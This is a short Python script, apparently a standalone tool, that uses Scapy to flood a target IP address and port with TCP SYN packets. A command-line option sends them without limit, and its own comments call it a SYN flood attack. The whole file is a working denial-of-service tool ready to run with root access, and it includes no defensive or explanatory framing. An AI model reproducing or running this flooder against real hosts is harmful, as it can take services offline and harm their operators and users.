import os # to use operating system dependent functionality. 
import sys #System specific parameters & functions
import random # Using the random module to get random numbers
import argparse # command-line parsing module in the Python standard library
import logging # This two lines are used to omit the IPv6 error displayed by importing scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * #Scapy is a powerful interactive packet manipulation program. It is able to alter packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more.
import urllib2 # this module is for fetching URLs 
if os.getuid() != 0: # Checks to see if the user running the script is root.
    print("Run this program with root access.")
    sys.exit(1)
parser = argparse.ArgumentParser(description='This sends SYN requests to the target specified in the arguments.') # These 4 lines are arugments that used to control the SYN flood attack on target
parser.add_argument('-d', action="store",dest='source', help='The destination IP address for the SYN packet')
parser.add_argument('-c', action="store",dest='count', help='The amount of SYN packets to send (enter X for unlimited)')
parser.add_argument('-p', action="store",dest='port', help='The destination port for the SYN packet')
args = parser.parse_args()
if len(sys.argv) == 1: # Help text is displayed if no argument is entered.
    parser.print_help()
    sys.exit(1)
args = vars(args) # converts the arguments into dictionary format for easier retrieval.
iterationCount = 0 # variable used to control the while loop for the amount of times a packet is sent.
if args['count'] == "X" or args['count'] == "x": # This allows us to send unlimited SYN segments to the destination IP address if the user entered an X or x.
    while (1 == 1):
        a=IP(dst=args['source'])/TCP(flags="S",  sport=RandShort(),  dport=int(args['port'])) # Creates the packet and assigns it to variable a. flag "S" is only enabled as we need to send only SYN packets
        send(a,  verbose=0) # Sends the Packet
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Packet Sent")
else: # executed if the user entered an amount of segments to be send.
    while iterationCount < int(args['count']):
        a=IP(dst=args['source'])/TCP(flags="S", sport=RandShort(), dport=int(args['port'])) # Creates the packet and assigns it to variable a
        send(a,  verbose=0) # Sends the Packet
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Packet Sent")
print("All packets successfully sent.")